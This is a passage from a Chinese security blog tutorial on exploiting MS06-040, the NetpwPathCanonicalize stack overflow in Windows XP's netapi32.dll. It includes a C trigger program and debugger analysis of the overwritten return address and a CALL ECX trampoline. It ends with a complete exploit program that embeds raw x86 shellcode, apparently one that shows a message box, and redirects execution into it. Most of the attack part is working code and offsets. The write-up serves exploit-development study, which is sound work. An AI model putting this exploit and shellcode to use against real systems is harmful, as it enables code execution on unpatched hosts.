(0x150*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OUTBUF_SIZE 0x440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREFIX_SIZE 0x410</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> PathName1[PATH1_SIZE];</span><br><span class="line">    <span class="type">char</span> PathName2[PATH2_SIZE];</span><br><span class="line">    <span class="type">char</span> Outbuf[OUTBUF_SIZE];</span><br><span class="line">    <span class="type">int</span> OutbufLen=OUTBUF_SIZE;</span><br><span class="line">    <span class="type">char</span> Prefix1[PREFIX_SIZE];</span><br><span class="line">    <span class="type">char</span> Prefix2[PREFIX_SIZE];</span><br><span class="line">    <span class="type">long</span> PathType1=<span class="number">44</span>;</span><br><span class="line">    <span class="type">long</span> PathType2=<span class="number">44</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//load vulnerability netapi32.dll which we got from a WINXP sp0 host</span></span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[ ] = <span class="string">&quot;./netapi32.dll&quot;</span>; <span class="comment">// care for the path</span></span><br><span class="line">    <span class="type">char</span> VulFunc[ ] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// fill PathName</span></span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">sizeof</span>(PathName1)<span class="number">-2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="string">&#x27;b&#x27;</span>,<span class="keyword">sizeof</span>(PathName2)<span class="number">-2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set Prefix as a null string</span></span><br><span class="line">    <span class="built_in">memset</span>(Prefix1,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix1));</span><br><span class="line">    <span class="built_in">memset</span>(Prefix2,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix2));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// call NetpwPathCanonicalize several times to overflow</span></span><br><span class="line">    (Trigger)(PathName1,Outbuf,<span class="number">1</span> ,Prefix1,&amp;PathType1,<span class="number">0</span>);</span><br><span class="line">    (Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&amp;PathType2,<span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态调试-2"><a class="markdownIt-Anchor" href="#动态调试-2"></a> 动态调试</h2><p>在动态调试时，当第二次调用 NetpwPathCanonicalize，运行至 0x5FDDA33E 处的 wcscat 时发生了栈溢出，如下图所示。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717215304487.png" alt="image-20220717215304487"></p><p>可以看到， EBP、返回地址以及 CanonicalizePathName 的部分参数被覆盖，溢出成功。ecx 始终指向栈中（0x0012EA18），那我们就选用 0x71BBFCBE 处的 CALL ECX 作为跳板。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717220145700.png" alt="image-20220717220145700"></p><p>从上面溢出图片可以看出，0x0012EE2C 是被 ”bbbb“ 溢出覆盖了，我们只用找到它相对偏移就能够替换掉 0x0012EE2C 处的内容。向前找到 b 的起始位置，可以看到 b 从 0x0012EB9A 处开始，相对偏移就是 0x(292+4)。直接在钩造完成后，复制前，把PathName2[296] 覆盖为我们想要的地址( 0x71BBFCBE )。</p><p>因为我们需要执行 shellcode，所以我们要把 shellcode 放在 PathName1 的开头，就能运行。</p><p>按照如下布局，构建代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__stdcall * MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH1_SIZE (0xc2*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH2_SIZE (0x150*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OUTBUF_SIZE 0x440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREFIX_SIZE 0x410</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> ShellCode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> PathName1[PATH1_SIZE];</span><br><span class="line">    <span class="type">char</span> PathName2[PATH2_SIZE];</span><br><span class="line">    <span class="type">char</span> Outbuf[OUTBUF_SIZE];</span><br><span class="line">    <span class="type">int</span> OutbufLen=OUTBUF_SIZE;</span><br><span class="line">    <span class="type">char</span> Prefix1[PREFIX_SIZE];</span><br><span class="line">    <span class="type">char</span> Prefix2[PREFIX_SIZE];</span><br><span class="line">    <span class="type">long</span> PathType1=<span class="number">44</span>;</span><br><span class="line">    <span class="type">long</span> PathType2=<span class="number">44</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//load vulnerability netapi32.dll which we got from a WINXP sp0 host</span></span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[ ] = <span class="string">&quot;./netapi32.dll&quot;</span>; <span class="comment">// care for the path</span></span><br><span class="line">    <span class="type">char</span> VulFunc[ ] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// fill PathName</span></span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">sizeof</span>(PathName1)<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 将ShellCode拷贝到缓冲区中</span></span><br><span class="line">	<span class="built_in">memcpy</span>(PathName1, ShellCode, <span class="keyword">sizeof</span>(ShellCode));</span><br><span class="line">	<span class="comment">// 将ShellCode后面的0x00填充为0x90</span></span><br><span class="line">	PathName1[<span class="keyword">sizeof</span>(ShellCode)<span class="number">-1</span>] = <span class="number">0x90</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set Prefix as a null string</span></span><br><span class="line">    <span class="built_in">memset</span>(Prefix1,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix1));</span><br><span class="line">    <span class="built_in">memset</span>(Prefix2,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix2));</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="string">&#x27;b&#x27;</span>,<span class="keyword">sizeof</span>(PathName2)<span class="number">-2</span>);</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 将返回地址覆盖为jmp ebp 71BBFCBE</span></span><br><span class="line">	PathName2[<span class="number">0x296</span>] = <span class="number">0xBE</span>;</span><br><span class="line">	PathName2[<span class="number">0x297</span>] = <span class="number">0xFC</span>;</span><br><span class="line">	PathName2[<span class="number">0x298</span>] = <span class="number">0xBB</span>;</span><br><span class="line">	PathName2[<span class="number">0x299</span>] = <span class="number">0x71</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// call NetpwPathCanonicalize several times to overflow</span></span><br><span class="line">    (Trigger)(PathName1,Outbuf,<span class="number">1</span> ,Prefix1,&amp;PathType1,<span class="number">0</span>);</span><br><span class="line">    (Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&amp;PathType2,<span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，运行，又是我们熟悉的对话框。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717230456660.png" alt="image-20220717230456660"></p></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/" title="RPC入侵：MS06-040" target="_blank" rel="external">https://www.rgzzplus.com/2022/07/20/RPC入侵：MS06-040/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="https://github.com/rgzz-zq" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/avatar.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="https://github.com/rgzz-zq" target="_blank"><span class="text-dark">人工智障plus</span><small class="ml-1x"></small></a></h3><div>一只网安菜鸟。</div></div></figure></div></div></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/" title="RPC入侵：MS08-067"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/" title="重重保护下的堆"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/rgzz-zq" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul><div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_pv">总访问量：<span id="busuanzi_value_site_pv"></span></span> <span class="post-meta-divider"><br></span><span id="busuanzi_container_site_uv">总访客数：<span id="busuanzi_value_site_uv"></span></span></div><div class="copyright">&copy; 2022 rgzzplus<div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!0,notify:!0,appId:"Ese7lhBjjv43UJw6zLdiIfS0-gzGzoHsz",appKey:"FF6J9UoHgtozwmftxTYfrvqn",placeholder:"说点什么吧！",avatar:"mm",meta:meta,pageSize:"10",visitor:!0})</script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script><script>$(document).ready(function(){$("article img").not("[hidden]").not(".panel-body img").each(function(){var a,t,n=$(this),e=n.attr("alt"),r=n.parent("a");r.length<1&&(-1!=(t=(a=this.getAttribute("src")).lastIndexOf("?"))&&(a=a.substring(0,t)),r=n.wrap('<a href="'+a+'"></a>').parent("a")),r.attr("data-fancybox","images"),e&&r.attr("data-caption",e)}),$().fancybox({selector:'[data-fancybox="images"]',hash:!1,loop:!1})})</script><script defer>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="//hm.baidu.com/hm.js?94cb135e2b01d42780f4972cb63e3884";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script></body></html>